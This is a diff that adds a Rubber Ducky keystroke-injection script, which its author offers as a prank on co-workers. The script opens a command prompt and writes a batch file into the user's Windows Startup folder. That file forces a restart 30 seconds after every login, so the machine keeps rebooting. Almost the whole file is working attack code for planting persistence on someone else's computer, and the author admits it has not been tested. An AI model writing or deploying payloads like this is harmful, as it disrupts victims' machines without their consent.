@@ -1,0 +1,26 @@
+REM ////////////////////////////////////////////////////////////////////////////////////////////////////////
+REM ///       I don't have a ducky (yet) but this is a trick I used to pull on co-workers.               ///
+REM ///       Because I don't have a ducky I'm guessing at the delays based on other scripts.            ///
+REM ////////////////////////////////////////////////////////////////////////////////////////////////////////
+REM Open the command line. You don't need admin because you are only adding to the Users Startup Directory
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+ENTER
+DELAY 100
+REM start making Shutdown.bat 
+STRING copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Shutdown.bat"
+STRING @echo off
+ENTER
+STRING shutdown /r /t 30
+REM The shutdown command has many good options '/t' adds a Delay, and '/r' restarts
+REM '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'
+ENTER
+CTRL z
+STRING exit
+ENTER
+REM ////////////////////////////////////////////////////////////////////////////////////////////////////////
+REM ///    I think I did everything right in this, but i don't have a Ducky to test it with. Let me know ///
+REM ///    what you think or if I made a mistake.					                 ///
+REM ////////////////////////////////////////////////////////////////////////////////////////////////////////
